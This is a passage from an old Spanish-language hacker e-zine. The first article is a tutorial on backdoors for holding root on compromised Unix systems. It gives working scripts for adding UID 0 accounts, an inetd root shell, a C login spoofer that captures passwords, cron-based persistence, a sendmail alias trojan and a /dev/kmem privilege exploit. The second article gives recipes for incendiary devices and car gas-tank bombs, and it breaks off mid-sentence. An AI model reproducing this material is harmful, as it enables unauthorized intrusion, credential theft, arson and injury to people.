Argentina, M‚XiCo, Espa¤a, Costa Rica, y a todos los dem s de habla hispana
que se me olvid¢ mencionar. (Y por favor usen le lista de correo solo para
dudas ;D )


-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
PUERTAS TRASERAS -=( Azumlord )=-
-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

 Las famosisimas puertas traseras, que son tan utiles cuando finalmente has
logrado obtener el tan a¤orado root, estas ingeniosas utilidades te permitiran
mantener el root o por lo menos acceso al sistema,  en caso de ser
descubierto ;-)

 Hay muchas formas de dejar una puerta trasera he aqui ALGUNAS:

 inetd.conf I
 ~~~~~~~~~~~~
 En lo personal, una de mis favoritas puertas traseras, son las del
"/etc/inetd.conf". ¨¨ Que, que es el /etc/inetd.conf ?? bueno en ese archivo
se guarda la configuracion del /etc/inetd (Demonio de Internet) el cual se
encarga de escuchar las peticiones de conexion en los puertos TCP y UDP y
ejecutar el programa apropiado cuando una conexion llegue. e.j.

 [ Benito Camela quiere hacer un telnet a bbs.en.la.red, en donde su
   demonio de internet se encarga de escuchar la peticion de conexion
   al puerto 23(telnet) y al identificar a que puerto se quiere hacer
   la conexion, ejecuta el programa apropiado, en este caso ejecuta el
   servidor de telnet para que Benito se pueda conectar. ]

 Pos bueno, el archivo /etc/inetd.conf es mas o menos como este:
 
ftp     stream  tcp     nowait  root    /usr/etc/ftpd   ftpd
talk    dgram   udp     wait    root    /usr/etc/ntalkd ntalkd
[1]      [2]    [3]     [4]      [5]       [6]           [7]

 [1].- Es el nombre del demonio
 [2].- Este es el tipo de soquet que el demonio recibira, ya sea streams
       para el TCP o datagramas para el UDP.
 [3].- Este es el tipo de protocolo que usara el demonio.
 [4].- Aqui se especifica si el demonio es iterativo o concurrente o sea si
       pones "wait"(iterativo) el servidor aceptara una conexion al demonio y
       todas las conexiones que lleguen a este demonio se tendran que poner
       a "esperar" que la primer conexion termine. Y si pones "nowait"
       (concurrente) el servidor aceptara una conexion y ejecutara un proceso
       para mantener la conexion y despues se ira a esperar mas conexiones.
 [5].- El demonio se ejecutara como el usuario o UID que se ponga aqui.
 [6].- Es donde esta el comando que se ejecutara cuando una conexion llegue.
 [7].- Es el comando que se ejecutara cuando una conexion llegue. Algo que
       es importante comentar es que si el comando no necesita interactuar
       con el usuario, el demonio de internet lo manejara internamente, eso
       se puede hacer con la opcion "internal" en los campos [6] y [7]

  Para evitar que te descubran escoge un servicio que no es muy usado y
remplazalo con tu propio demonio aqui te van algunos ejemplos pa' que te
des una idea.

En el /etc/inetd.conf encuentra la linea:
        
        daytime stream  tcp     nowait  root    internal

y cambiala por:

        daytime stream  tcp     nowait /bin/sh  sh -i.  

 Despues, tienes que reiniciar el /etc/inetd para que la nueva configuracion
tenga efecto, para hacer eso puedes hacer esto:

$ kill -HUP (Proceso)---> Aqui pones el numerillo del proceso(PID)

 Te recomiendo que esto lo hagas cuando no haya nadie en el sistema
porque se interrumpiran todas las conexiones.

 O si lo deseas, envez de cambiar un servicio que ya existe, puedes
crear uno que corra el programa que tu quieras, he aqui un ejemplillo:

 Como vas a crear un servicio nuevo, asegurate de poner el nuevo servicio
en el /etc/services y en el /etc/inetd.conf, mas o menos asi es el
/etc/services:

smtp      25/tcp           mail    
[1]      [2]/[3]            [4]

 [1].- Este el nombre del servicio
 [2].- Este es el puerto del servicio
 [3].- Este es el protocolo del servicio
 [4].- Y este es el nombre comun asociado con el servicio.

 Ahora que ya sabes como es el formato del /etc/services, solo tienes que
agregar el servicio que quieres crear, en este caso yo creare un servicio
llamado "jeje", mas o menos asi:

jeje    24/tcp      jeje

 Que no se te vaya olvidar agregar esto en el /etc/inetd.conf:

jeje    stream  tcp    nowait  root  /bin/sh sh -i

 Y por ultimo solo tienes que reiniciar el inetd.

 Te estaras preguntando y que diablos fue lo que hize, pues bien acabas de
crear un servicio que te permitira entrar como root al sistema, lo unico
que tienes que hacer es hacer un telnet al puerto en el que creaste el
servicio, en este caso el puerto 24.

 inetd.conf II
 ~~~~~~~~~~~~~
 Si estas pensando que la puerta trasera de arriba, fue muy creativa espera
a ver esta........

 De nueva cuenta, te recomiendo utilizes algun servicio que no se use muy
seguido, en este caso el pop2 es un servicio que no se usa con mucha
frecuencia,  ademas de que si el administrador verifica el /etc/inetd.conf
sera mas dificil que descubra la puerta trasera!

 Esta es una entrada comun y corriente del archivo /etc/inetd.conf

pop2   stream  tcp     nowait  root    /usr/sbin/tcpd  in.pop2d

 Nota: En este caso, te habras dado cuenta que el path del comando que se
       ejecuta no es el path del in.pop2d, lo que sucede, es que cuando
       se hace una peticion de conexion al puerto 109(pop2) el tcpd se
       ejecuta para verificar si tienes acceso para ejecutar este servicio.
       Despues de que eres verificado el tcpd ejecuta el in.pop2d.

 Que pasaria si remplazaras el in.pop2d por un programa que ejecute
cualquier comando que nosotros queramos......

 Primero pones en algun lugar seguro el in.pop2d:

 mv ./usr/sbin/in.pop2d ./usr/sbin/in.pop4d

 Ahora creas un programa y lo nombras in.pop2d

#!/bin/csh
#Programa que agrega una cuenta al /etc/passwd por 2 minutos
#azumlord@hotmail.com
cd                      #Me voy al directorio raiz.
cd ./etc
echo "jnitales::0:0:Jorge Nitales:/:/bin/csh" >> ./etc/passwd #Agrego la cuenta.
sleep 120               #Espero 2 minutos.....
grep -v jnitales ./etc/passwd >> ./tmp/.yop
mv ./tmp/.yop ./etc/passwd
chmod 644 ./etc/passwd  # O como estaba antes.
rm ./tmp/.yop
#Si quieres que la puerta trasera sea eliminada despues de agregar
#la cuenta, quita el # a las siguientes dos lineas.
#mv ./usr/sbin/in.pop4d ./usr/bin/in.pop2d
#chmod 111 /usr/sbin/in.pop2d
#Eso es to, eso es to, eso es todo amigos.......

 Antes de reiniciar el inetd, verifica en el /etc/services que exista esta
linea:

pop2    109/tcp      pop2

 Ahora como ya es costumbre, cada vez que hagas algun cambio en el inetd.conf
tendras que reiniciar el inetd, y como ya explique eso pos ya no lo vuelvo a
explicar, pero si ya se te olvido checa el "inetd.conf I"
                                            ~~~~~~~~~~~~
 Y por ultimo haz un telnet al puerto 109 y te desconectas, el programa que
creaste se ejecutara y tendras 2 minutos para entrar con privilegios de root!!

 Un clasico el '.rhosts'
 ~~~~~~~~~~~~~~~~~~~~~~

 Bien, una de las puertas traseras que ya es mas que conocida, es el clasico
'+ +' en el .rhosts, el cual permite que cualquiera pueda entrar a la maquina
en que se encuentre este archivo. Como una nota tecnica el archivo .rhosts es
utilizado por servicios como el rlogin y el rsh como un metodo de autentifi-
cacion e.j.

 [ Rosa Celeste, tiene una cuenta en bancogf.com.mx, y por algun metodo
   llegas a entrar a este server, con la cuenta de esta se¤orita, ahora
   tu te encuentras en condon.en.algun.lugar.jp, te encuentras sorprendido
   porque lograste entrar pero para tu mala suerte el root esta dentro,
   y que es lo que haces???? pues pones el clasico '+ +' en el .rhosts
   para volver cuando el root no este ]


 Un UID 0 en el archivo de passwd
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 Bueno pues con el titulito te lo digo todo, esa es la forma mas rapida(y
para el administrador esta es la mas facil de descubrir) de dejar una puerta
trasera; es agregar un usuario con UID 0 en el archvo de passwd, pero si el
sistema que estas atacando tiene una gran cantidad de usuarios pues es una
buena idea recurrir a esto.

 Si vas ha hacer esto es mejor poner al usuario con UID 0 en el medio del
archivo de password, jeje y aqui te va un programita pa facilitarte el
trabajo.

#!/bin/csh
# Inserta un usuario con UID 0 en el medio del archivo de password
# Original de daemon9@netcom.com
# Traducido y modificado por azumlord@hotmail.com

set lineas = `wc -l /etc/passwd`
cd                                      # Has esto en el directorio raiz.
cp /etc/passwd ./pine01292              # Primero, hay que estar seguros.
echo El archivo de password tiene $lineas[1] lineas.
@ lineas[1] /= 2
@ lineas[1] += 1                        # Solo queremos 2 archivos temporales
echo Creando 2 archivos, $lineas[1] lineas cada uno \(aproximadamente\).
split -$lineas[1] ./pine01292           # Password string, opcional
echo "ecanon::0:0:Elma Canon Prieto:/home/u/ecanon:/bin/csh" >> ./yop #No vayas a usar ese nombre jeje
cat ./yo >> ./yop
mv ./jeje ./etc/passwd
chmod 644 ./etc/passwd                   # O como estaba antes
rm ./y* ./pine01292
echo Listo...

 Otra manera seria cambiar el password a algun usuario que ya tenga UID 0,
claro el del root no!!!!!!!!, que tal un usuario que no sea usado y que este
deshabilitado por ejemplo sync que tiene UID 0 pero que esta deshabilitado.

 No se ustedes pero yo soy un flojo, jeje aqui va un programilla pa mayor
comodidad.....

#!/bin/csh
#Programilla que cambia el passwd al usuario sync
#azumlord@hotmail.com
cd
cd ./etc
grep -v sync >> ./tmp/.pop666a
echo "sync::5:0:sync:/:/bin/csh" >> ./tmp/.pop666a
mv ./tmp/.pop666a ./etc/passwd
chmod 644 ./etc/passwd
echo Ya esta!......

 Login spoofing
 ~~~~~~~~~~~~~~
 El login spoofing, consiste mas que nada y como su nombre lo indica en
falsificar el programa /usr/bin/login que es el que se encarga de pedirte
el login o nombre de usuario y tu password o clave, esto te permitira
obtener los passwords de todos los usuarios incluyendo el del root.

Aqui un login spoofer:

  <-------------------------- EMPIEZA ------------------------------>

/* Program   : Unix login spoof
   Author    : The Shining/UPi (UK Division)
   Date      : Released 12/4/94
   Unix Type : All unshadowed unix systems &
               shadowed SUNOS systems
   Note      : This file MUST be exec'd from the shell. */


#include <stdio.h>
#include <string.h>
#include <signal.h>
#include <pwd.h>
#include <time.h>
#include <utime.h>

#define OUTFILE ".data"           /* Data file to save account info into */
#define LOGPATH "/usr/bin/login"  /* Path of real login program */
#define DUMMYID "sync"            /* Dummy account on your system */
#define DLENGTH 4                 /* Length of dummy account name */


FILE *fp;


/* Set up variables to store system time & date */

time_t now;

static int time_out, time_on, no_message, loop_cnt;


/* Set up a structure to store users information */

struct loginfo {
              char logname[10];
              char key[9];
              char *comment;
              char *homedir;
              char *shell;
            } u;


/* Use the unix function getpass() to read user password and
   crypt() or pwdauth()  (remove it below if not SUNOS)
   to validate it etc */

char *getpass(), *gethostname(), *alarm(), *sleep(),
     *crypt(), *ttyname(), *pwdauth(), motd, log_date[60],
     pass[14], salt[3], *tty, cons[] = " on console ",
     hname[72], *ld;


/* flag = exit status, ppid = pid shell, wait = pause length,
   pwstat = holds 0 if valid password, shadow holds 1 if shadow
   password system is being used, 0 otherwise. */

int flag, ppid, wait, pwstat, shadow, invalid;


/* Declare main functions */

     void write_details(struct loginfo *);
     void catch( void ), disable_interrupts( void );
     void log_out( void ), get_info( void ),
          invalid_login( void ), prep_str( char * );


/* set up pointer to point to pwfile structure, and also
   a pointer to the utime() structure */


struct passwd *pwentry, *getpwnam();
struct utimbuf *times;


int main( void )
{
system("clear");

/* Initialise main program variables to 0, change 'loop_cnt' to 1
   if you do not want the machines host name to appear with
   the login prompt! (e.g. prompt is `login:` instead of
   'MIT login:'  etc) */

     wait = 3;               /* Holds value for pause */
      flag = 0;              /* Spoof ends if value is 1 */
       loop_cnt = 0;         /* Change this to 1 if no host required */
       time_out = 0;         /* Stops timer if spoof has been used */
      time_on = 0;           /* Holds minutes spoof has been running */
     disable_interrupts();   /* Call function to disable Interrupts */


/* Get system time & date and store in log_date, this is
   displayed when someone logs in as 'sync' */

 now = time(NULL);
  strftime(log_date, 60, "Last Login: %a %h %d %H:%M:%S", localtime(&now));
  strcat(log_date, cons);
 ld = log_date;


/* Get Hostname and tty name */

gethostname(hname, 64);
 strcat(hname, " login: ");
tty = ttyname();


/* main routine */

  while( flag == 0 )
  {
       invalid = 0;        /* Holds 1 if id +/or pw are invalid */
        shadow = 0;        /* 1 if shadow scheme is in operation */
         no_message = 0;   /* Flag for Login Incorrect msg */
        alarm(50);         /* set timer going */
       get_info();         /* get user i.d. & password */


/* Check to see if the user i.d. entered is 'sync', if it is
   display system time & date, display message of the day and
   then run the spoof again, insert the account of your
   choice here, if its not sync, but remember to put
   the length of the accounts name next to it! */

     if (strncmp(u.logname, DUMMYID, DLENGTH) == NULL) {
        printf("%s\n", ld);

          if ((fp = fopen("/etc/motd", "r")) != NULL) {
              while ((motd = getc(fp)) != EOF)
                     putchar(motd);

              fclose(fp);
          }

           printf("\n");
             prep_str(u.logname);
             no_message = 1;
           sleep(wait);
     }


/* Check if a valid user i.d. has been input, then check to see if
   the password system is shadowed or unshadowed.
   If both the user i.d. & password are valid, get additional info
   from the password file, and store all info in a file called .data,
   then exit spoof and run real login program */

    setpwent();   /* Rewind pwfile to beign processing */


    if ((pwentry = getpwnam(u.logname)) == (struct passwd *) NULL) {
         invalid = 1;
        flag = 0;
    }
    else
       strncpy(salt, pwentry->pw_passwd, 2);


/* Check for shadowed password system, in SUNOS, the field in /etc/passwd
   should begin with '##', in system V it could contain an 'x', if none
   of these exist, it checks that the entry = 13 chars, if less then
   shadow system will probably be implemented (unless acct has been
   disabled) */

 if ( invalid == 0 ) {

       if ((strcmp(salt, "##")) || (strncmp(salt, "x", 1)) == NULL)
           shadow = 1;
       else
          if (strlen(pwentry->pw_passwd) < 13)
             shadow = 1;


/* If unshadowed, use the salt from the pwfile field & the key to
   form the encrypted password which is checked against the entry
   in the password file, if it matches, then all is well, if not,
   spoof runs again!! */

    if ( shadow != 1 ) {

      if (strcmp(pwentry->pw_passwd, crypt(u.key, salt)) == NULL)
         invalid = 0;
      else
         invalid = 1;
    }


/* If SUNOS Shadowing is in operation, use the pwdauth() function
   to validate the password, if not SUNOS, substitute this code
   with the routine I gave earlier! */

       if ( shadow == 1 ) {
          if (pwstat = pwdauth(u.logname, u.key) == NULL)
             invalid = 0;
          else
             invalid = 1;
       }
}


/* If we have a valid account & password, get user info from the
   pwfile & store it */

        if ( invalid == 0 ) {

           u.comment = pwentry->pw_gecos;
            u.homedir = pwentry->pw_dir;
           u.shell = pwentry->pw_shell;

          /* Open file to store user info */

           if ((fp = fopen(OUTFILE, "a")) == NULL)
              log_out();

               write_details(&u);
                fclose(fp);
                no_message = 1;
               flag = 1;
        }
        else
           flag = 0;

        invalid_login();

    endpwent();                       /* Close pwfile */

    if (no_message == 0)
       loop_cnt++;

  }                                  /* end while */

log_out();                           /* call real login program */

}


/* Function to read user i.d. & password */

void get_info( void )
{
   char user[11];
   unsigned int string_len;

   fflush(stdin);
    prep_str(u.logname);
    prep_str(u.key);
   strcpy(user, "\n");


/* Loop while some loser keeps hitting return when asked for user
   i.d. and if someone hits CTRL-D to break out of spoof. Enter
   a # at login to exit spoof. Uncomment the appropriate line(s)
   below to customise the spoof to look like your system */

  while ((strcmp(user, "\n") == NULL) && (!feof(stdin)))
  {
   /* printf("Scorch Ltd SUNOS 4.1.3\n\n); */

    if (loop_cnt > 0)
       strcpy(hname, "login: ");

      printf("%s", hname);
      fgets(user, 9, stdin);


   /* Back door for hacker, # at present, can be changed,
      but leave \n in. */

     if (strcmp(user, "#\n") == NULL)
         exit(0);


    /* Strip \n from login i.d. */

     if (strlen(user) < 8)
        string_len = strlen(user) - 1;
     else
        string_len = strlen(user);

     strncpy(u.logname, user, string_len);



/* check to see if CTRL-D has occurred because it does not
   generate an interrupt like CTRL-C, but instead generates
   an end-of-file on stdin */

     if (feof(stdin)) {
         clearerr(stdin);
        printf("\n");
     }

  }



/* Turn off screen display & read users password */

     strncpy(u.key, getpass("Password:"), 8);

}



/* Function to increment the timer which holds the amount of time
   the spoof has been running */

void catch( void )
{
  time_on++;


/* If spoof has been running for 15 minutes, and has not
   been used, stop timer and call spoof exit routine */

if ( time_out == 0 ) {
   if (time_on == 15) {
       printf("\n");
        alarm(0);
       log_out();
   }
}


/* 'Touch' your tty, effectively keeping terminal idle time to 0 */

 utime(tty, times);
alarm(50);
}



/* Initialise a string with \0's */

void prep_str( char str[] )
{
int strl, cnt;

strl = strlen(str);
for (cnt = 0; cnt != strl; cnt++)
    str[cnt] = ' ';
}


/* function to catch interrupts, CTRL-C & CTRL-Z etc as
   well as the timer signals */

void disable_interrupts( void )
{
   signal(SIGALRM, catch);
    signal(SIGQUIT, SIG_IGN);
     signal(SIGTERM, SIG_IGN);
    signal(SIGINT, SIG_IGN);
   signal(SIGTSTP, SIG_IGN);
}


/* Write the users i.d., password, personal information, homedir
   and shell to a file */

void write_details(struct loginfo *sptr)
{

   fprintf(fp, "%s:%s:", sptr->logname, sptr->key);
    fprintf(fp, "%d:%d:", pwentry->pw_uid, pwentry->pw_gid);
     fprintf(fp, "%s:%s:", sptr->comment, sptr->homedir);
    fprintf(fp, "%s\n", sptr->shell);
   fprintf(fp, "\n");
}



/* Display login incorrect only if the user hasn't logged on as
   'sync' */

void invalid_login( void )
{

         if ( flag == 1 && pwstat == 0 )
            sleep(wait);

         if ( no_message == 0 )
            printf("Login incorrect\n");
}


/* Displays appropriate message, exec's the real login program,
   this replaces the spoof & effectively logs spoof's account off.
   Note: this spoof must be exec'd from the shell to work */

void log_out( void )
{
  time_out = 1;

   if ( no_message == 1 ) {
        sleep(1);
       printf("Login incorrect\n");
   }

   execl(LOGPATH, "login", (char *)0);
}

  <-------------------------- TERMINA ------------------------------>


 El SUID root shell en el /tmp. 
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 De que se trata cuando hablamos de un SUID root shell??, pues bien cuando
otienes el root copias el /bin/csh a algun archivo en el /tmp despues
de hacer esto cambias los permisos para que cuando no seas root
puedas executarlo, mas o menos asi............

cp /bin/csh /tmp/.ujua
chmod 4755 /tmp/.ujua

 Ahora cuando ejecutes /tmp/.ujua tendras privilegios de root.

 Caballos de Troya con el Cron I
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 Explicare algunas formas de poner caballos de troya, con el demonio del reloj
'Cron', el Cron es una herramienta que permite ejecutar comandos a determinadas
horas y dias, la lista de tareas que el Cron realizara se localiza en
/var/spool/cron/crontabs/root, pues bien ahora si tu quieres quitar,
agregar o ver una tarea puedes usar el comando Crontab o editarlo manualmente
con el editor que mas te guste ya sea vi, pico, etc.

 Una entrada de una tarea o crontab, es mas o menos asi:

 0       6       6       6       *            /bin/buh
[1]     [2]     [3]     [4]     [5]             [6]

 [1] Es el minuto, los valores acepetados son del 0-59
 [2] Es la hora, rango aceptado 0-23
 [3] Es el dia del mes, rango aceptado 1-31
 [4] Es el Mes, rango aceptado 1-12
 [5] Dia de la semana, rango aceptado 0-6
 [6] Y pues aqui se pone el comando o script que se ejecutara.

 En el ejemplo de arriba se puede ver que cada 6 de Junio a las 6 horas se
se ejecutara el comando /bin/buh. Jejeje ahora ven la peligrosidad de una
herramienta como esta???? DIABOLICO no? };->

  Una buena forma de explotar el Cron, seria que este verificara diaramente si
las demas puertas traseras que instalamos estan, y en caso de que ya no esten
que las vuelva a instalar.e.j.

 En el caso donde agregabamos un UID 0 al /etc/passwd, en el
/var/spool/crontab/root tendriamos que agregar algo como esto:

        0       0       *       *       *       /usr/bin/nuestroprograma

 En donde "nuestroprograma" seria esto:

#!/bin/csh
# Programa que verifica que el usuario ecanon este en el /etc/passwd
# y si no esta pues lo vuelve a agregar.
# Original de daemon9@netcom.com
# Traducido y modificado por azumlord@hotmail.com

set usuario = (`grep ecanon /etc/passwd`)    

if($#usuario == 0) then                        # Esta ahi?

        set lineas = `wc -l /etc/passwd`
        cd                                      # Has esto en el directorio raiz.
        cp /etc/passwd ./pine01292              # Primero, hay que estar seguros.
        echo El archivo de password tiene $lineas[1] lineas.
        @ lineas[1] /= 2
        @ lineas[1] += 1                        # Solo queremos 2 archivos temporales
        echo Creando 2 archivos, $lineas[1] lineas cada uno \(aproximadamente\).
        split -$lineas[1] ./pine01292           # Password string, opcional
        echo "ecanon::0:0:Elma Canon Prieto:/home/u/ecanon:/bin/csh" >> ./yop #No vayas a usar ese nombre jeje
        cat ./yo >> ./yop
        mv ./jeje ./etc/passwd
        chmod 644 ./etc/passwd                   # O como estaba antes
        rm ./y* ./pine01292
else
endif   

 Caballos de Troya con el Cron II
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 Otra forma de utilizar el Cron seria hacer que este, por un minuto, todos los
dias a una determinada hora cambie el verdadero archivo de passwd por nuestro
archivo de passwd el cual contiene solo una linea, (Je) el de la cuenta del
root, en ese minuto todo aquel que intente entrar no podra hacerlo, pero
pasado el minuto todo volvera a la normalidad.

  Tu escoges la hora, el dia(los dias) y el tiempo en que quieras que se
ejecute, en este caso, se ejecutara todos los dias a la 1:00am, en el
/var/spool/crontab/root agrega esto:

     0       1       *       *       *       /bin/usr/nuestroprograma

Ahora creamos nuestro archivo de passwd con la cuenta de root.

echo "root::0:0:Super-User:/:/bin/csh" > /var/spool/mail/.sneaky

Y esto es lo que debe de ir en /bin/usr/nuestroprograma

#!/bin/csh
# Instala un caballo de troya en el /etc/passwd por un minuto.
#daemon9@netcom.com

cp /etc/passwd /etc/.temppass
cp /var/spool/mail/.sneaky /etc/passwd
sleep 60
mv /etc/.temppass /etc/passwd

 Como ya te habras dado cuenta los caballos de toya con el Cron son
muy creativos, tu puedes inventar los tuyos, todo depende de tu
imaginacion, jeje.

 El troyano del alias del uudecode
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 El archivo de alias del senmail permite enviar un mail a un usuario o
a varios incluso es posible enviar la salida(output) a un programa.

 Agrega esta linea:

 "decode": "|/usr/bin/uudecode"

 Al archivo /etc/aliases. Normalmente tendras que creas un .rhost codificado
con el uuencode, con el path completo.

#! /bin/csh
# Crea nuestro archivo .rhosts. 
echo "+ +" > tmpfile
/usr/bin/uuencode tmpfile /root/.rhosts

 Ahora haz un telent a la maquina victima en el puerto 25. Y envia un fake
mail al "decode" y usa como subject o asunto, la version codificada con el
uuencode del archivo .rhosts. Para una 

Next telnet to the desired site, port 25. Simply fakemail to decode and
use as the subject body, the uuencoded version of the
.rhosts file. For a one liner (not faked, however) do this: 

%echo "+ +" | /usr/bin/uuencode /root/.rhosts | mail decode@target.com

 En este caso puedes ser tan creativo como desees. Por ejemplo, podrias
preparar un alias que cuando le envies un mail, corra el programa que tu
quieras. Podrias hacer correr culaquier script de los que vienen en este
texto.

 El exploit del /dev/kmem
 ~~~~~~~~~~~~~~~~~~~~~~~~
 Este archivo representa la memoria virtual del sistema. Desde que el
kernel mantiene sus parametros en la memoria, es posible modificar
la memoria de la maquina para cambiar el UID de tus procesos.

 Para hacerlo se requiere que el /dev/kmem tenga permisos de lectura y
escritura. Despues necesitas, Abrir el dispositivo /dev/kmem, buscar tu
pagina en memoria, sobreescribir el UID de tu proceso actual, exparsir
un csh, el cual sera el que cambie este UID. El siguiente programa hace
exactamente eso.

/* Si el /kmem tiene permisos de lectura y escritura este programa cambiara
el UID y el GID del usuario a 0.  */
/* Este codigo aparecio originalmente en "UNIX security:  A practical tutorial" 
tiene algunas modificaciones hechas por daemon9@netcom.com */

#include 
#include 
#include 
#include 
#include 
#include 
#include 

#define KEYWORD "nomenclature1"

struct user userpage;
long address(), userlocation;

int main(argc, argv, envp)
int argc;
char *argv[], *envp[];{

        int count, fd;
        long where, lseek();
        
        if(argv[1]){            /* we've got an argument, is it the keyword? */
                if(!(strcmp(KEYWORD,argv[1]))){
                        fd=(open("/dev/kmem",O_RDWR);

                        if(fd<0){
                                printf("Cannot read or write to /dev/kmem\n");
                                perror(argv);
                                exit(10);       
                        }
                                
                        userlocation=address();
                        where=(lseek(fd,userlocation,0);
        
                        if(where!=userlocation){
                                printf("Cannot seek to user page\n");
                                perror(argv);
                                exit(20); 
                        }

                        count=read(fd,&userpage,sizeof(struct user));
        
                        if(count!=sizeof(struct user)){
                                printf("Cannot read user page\n");
                                perror(argv);
                                exit(30);
                        }       

                        printf("Current UID: %d\n",userpage.u_ruid);
                        printf("Current GID: %d\n",userpage.g_ruid);
                        
                        userpage.u_ruid=0;
                        userpage.u_rgid=0;
                        
                        where=lseek(fd,userlocation,0);

                        if(where!=userlocation){        
                                printf("Cannot seek to user page\n");
                                perror(argv);
                                exit(40); 
                        }
                        
                        write(fd,&userpage,((char *)&(userpage.u_procp))-((char *)&userpage));
                        
                        execle("/bin/csh","/bin/csh","-i",(char *)0, envp);
                }
        } 

} /* End main */

#include 
#include 
#include 

#define LNULL ((LDFILE *)0)

long address(){
        
        LDFILE *object;
        SYMENT symbol;
        long idx=0;

        object=ldopen("/unix",LNULL);

        if(!object){
                fprintf(stderr,"Cannot open /unix.\n");
                exit(50);
        }

        for(;ldtbread(object,idx,&symbol)==SUCCESS;idx++){
                if(!strcmp("_u",ldgetname(object,&symbol))){
                        fprintf(stdout,"User page is at 0x%8.8x\n",symbol.n_value);
                        ldclose(object);
                        return(symbol.n_value);
                }
        }

        fprintf(stderr,"Cannot read symbol table in /unix.\n");
        exit(60);
}

 Como el codigo de arriba requiere que sea accesible para todos y como
esto no simpre sucede, estaria bien hacer un script shell que cambie
los permisos por un tiempo determinado, esto lo podrias agregar en el

Caballos de Troya con el Cron II
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

chmod 666 /dev/kmem
sleep 300               # Espera 5 minutos
chmod 600 /dev/kmem     # O como estaba antes.

 Este texto esta basado en:

 "Backdoor" por daemon9 de la e-zine "The Infinity Concept Issue II" Casi todo :-)
 "Backdoors" por Christopher Klaus 8/4/97
 "Inetd Backdoors" por Phreak-0 del Confidence Remains High

-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

ÍÍÍÍÍÍÍÍÍÍÍÍËÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍËÍÍÍÍÍÍÍÍÍÍÍÍÍ
            ÈÍÍÍÍÍÍÍÍÍÍÍ» Bombas, bombas! que pasa? ÉÍÍÍÍÍÍÍÍÍÍÍ¼
ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹       Por: Mr.Nexus       ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
                        ÈÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¼

        Bueno, aqu¡ empieza un texto con el cual podr s reventar 
                          1.- Cajetilla Incendiaria:

        Se utiliza un paquete de cigarillos para esconder los siguientes
ingredientes. Acido sulf£rico, clorato de potasio, y az£car.  El  cido
sulf£rico se coloca en un tubo de ensayo sellado y colocado en un condon.
El az£car y el clorato de potasio se colocan en un segundo condon, despu‚s se
coloca el primer condon en el segundo, que contiene el azucar y el clorato de
potasio. Para activar el contenido se rompe el tubo de ensayo que contiene el
 cido sulf£rico. El  cido sulf£rico tardar  30 minutos en penetrar el primer
cond¢n. Cuando el  cido entra en contacto con los otros ingredientes causa una
combusti¢n instant nea.
        Para que este artefacto tenga mejores resultados, es aconsejable
colocarlo cerca de alg£n material que pueda servir de combustible, ropa,
papeles,...
        Otra cosa m s, los compuestos necesarios los puedes comprar en
cualquier tienda o laboratorio abierto al p£blico, por ejemplo, un litro de
sulf£rico cuesta alrededor de 700 ptas, por cierto, la concentraci¢n del
 cido es dir‚ctamente proporcional a la rapidez con que corroe al cond¢n, as¡
que compra un  cido de concentraci¢n baja, no vaya a ser que en cuanto dejes
la cajetilla se empieze a quemar y ... nos vemos en el talego!


                    2.- Bombillas de Luz, de MUCHA "luz":

      Una bombilla de luz com£n y corriente puede ser utilizada como un
artefacto incendiario.  Utilizando un taladro de alta velocidad se hace un
peque¤o orificio en cristal de la bombilla (por arriba, o sea justo debajo
de la rosca), sin da¤ar los filamentos dentro de la bombilla. Con una
jeringuilla se inyecta gasolina dentro de la bombilla y se sella el orificio
con pegamento. Luego se enrrosca la bombilla en la l mpara asegurandose que
el interuptor esta en la posici¢n de apagado.
           REPITO: ASGURATE DE QUE EL INTERRUPTOR ESTU EN OFF.
        Cuando se encienda la bombilla, resultar  un fuego explosivo, en dos
palabras, im-prezionante.


                      3.- Molotov Cocktail Party:

        A estas alturas supongo que todo el mundo, ya sabr  c¢mo hacer el
cocktail Molotov t¡pico as¡ que paso de explicarlo. Lo que digo ahora es c¢mo
hacer uno que no hace falta encenderlo primero (si los prendes primero se ven
venir y pierde la gracia pq los objetivos se esconden).
        Hay muchas maneras de conseguir ‚sto pero la m s com£n ser¡a mezclar
clorato de potasio con azucar y agua para formar un l¡quido semi-espeso. Se
empapan unas tiras de tela en ‚sto, y se permite que se sequen. Se adhieren
estas tiras secas con cinta adhesiva a la superficie de la botella despu‚s de
haberla llenado con la mezcla de gasolina y aceite de rigor. Con mucho cuidado
se a¤aden una o dos onzas de  cido sulf£rico. El  cido no se mezclar  con la
mezcla y se ir  al fondo de la botella. Al romper la botella contra el
objetivo el sulf£rico entrar  en contacto con la tela impregnada con el
clorato de potasio y az£car causando un fuego instant neo y la combusti¢n
de la mezcla de gasolina y aceite.


                    4.- Bombas de Tanque de Gasolina:

La bombas de tanque de gasolina se pueden hacer de varias formas, son los
t¡picos revienta-coches utilizados por los estudiantes que son suspendidos
sin razones "aparentes".
Vamos a ver, hay dos formas posibles de hacer estallar un coche:

        a.- Utilizando un taladro de alta velocidad se hace un agujero
peque¤o a una bola de ping-pong. Con una aguja hipod‚rmica se procede a llenar
la bola con Drano l¡quido. Se sella el agujero de la bola con pegamento. La
bola es luego introducida en el tanque de gasolina del coche en cuesti¢n. En
30 minutos la gasolina destruir  la bola de ping-pong permitiendo que el
Drano entre en contacto con la gasolina causando un buuummm!
        Nota: cuando digo "sellar" quiero decir SELLAR, no quisiera estar en
